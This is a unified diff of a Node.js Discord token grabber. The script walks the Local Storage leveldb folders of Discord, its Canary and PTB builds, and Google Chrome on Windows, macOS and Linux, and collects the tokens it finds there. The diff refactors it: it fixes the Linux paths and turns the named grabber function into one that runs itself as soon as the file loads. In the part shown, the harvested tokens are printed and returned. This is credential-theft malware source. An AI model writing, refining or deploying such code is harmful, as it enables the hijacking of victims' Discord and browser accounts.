@@ -4,13 +4,9 @@ const path = require('path');
 const findToken = (tokenPath) => {
     const computerPlatform = process.platform;
 
-    const windows = 'win32';
-    const macOS = 'darwin';
-    const linux = 'linux';
-
     let tokens = [];
 
-    if (computerPlatform == windows) {
+    if (computerPlatform == 'win32') {
         tokenPath += '\\Local Storage\\leveldb';
 
         try {
@@ -40,7 +36,7 @@ const findToken = (tokenPath) => {
         } catch (error) {
             console.log(`=> No directory found for ${tokenPath}`);
         }
-    } else if (computerPlatform == macOS) {
+    } else if (computerPlatform == 'darwin') {
         tokenPath += '/Local Storage/leveldb/';
 
         try {
@@ -68,8 +64,8 @@ const findToken = (tokenPath) => {
         } catch (error) {
             console.log(`=> No directory found for ${tokenPath}`);
         }
-    } else if (computerPlatform === linux) {
-        tokenPath += '/Local Storage/leveldb/';
+    } else if (computerPlatform === 'linux') {
+        tokenPath += '/Default/Local Storage/leveldb/';
 
         try {
             fs.readdirSync(path.normalize(tokenPath)).map((file) => {
@@ -104,7 +100,7 @@ const findToken = (tokenPath) => {
     return tokens;
 };
 
-function discordTokenGrabber() {
+(() => {
     let paths;
     const computerPlatform = process.platform;
 
@@ -143,11 +139,10 @@ function discordTokenGrabber() {
         const home = path.join(process.env.HOME, '.config/');
 
         paths = {
-            'Discord': path.join(home, 'discord'),
-            'Discord Canary': path.join(home + 'discordcanary' + '/Default'),
-            'Discord PTB': path.join(home + 'discordptb' + '/Default'),
-            'Google Chrome': path.join(home + 'google-chrome' + '/Default'),
-            'Chromium': path.join(home + 'chromium' + '/Default')
+            Discord: path.join(home, 'discord'),
+            'Discord Canary': path.join(home + 'discordcanary'),
+            'Discord PTB': path.join(home + 'discordptb'),
+            'Google Chrome': path.join(home + 'google-chrome')
         };
     } else if (computerPlatform == 'darwin') {
         paths = {
@@ -215,6 +210,4 @@ function discordTokenGrabber() {
     }
     console.log(tokens);
     return tokens;
-}
-
-discordTokenGrabber();
+})();
